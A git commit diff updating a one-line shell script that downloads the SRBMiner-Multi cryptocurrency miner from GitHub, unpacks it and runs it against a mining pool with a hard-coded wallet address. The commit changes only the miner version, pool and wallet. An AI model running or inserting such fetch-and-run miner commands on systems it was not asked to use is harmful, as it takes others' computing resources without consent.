aede4939ffb4e69c5fa72305fee344f98aeda03d
barburonjilo <barburonjilo@outlook.co.id>
2025-01-13 14:30:44 +0700

    Update nes.sh

--- nes.sh
+++ nes.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz && rm SRBMiner-Multi-2-4-7-Linux.tar.xz && cd SRBMiner-Multi-2-4-7 && ./SRBMiner-MULTI -a yespower --pool crimson-pool.com:17971 -u WQsbfeD4zgmShjK3nLyeZMTjo9tsx3eyDQ
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz && rm SRBMiner-Multi-2-7-5-Linux.tar.gz && cd SRBMiner-Multi-2-7-5 && ./SRBMiner-MULTI -a yespowerLTNCG -o stratum+tcp://eu.coinXpool.com:3737 -u K8KNMZgpbHGJwmjwXE76eebHttTpugcxUj.1 -p c=CRNC
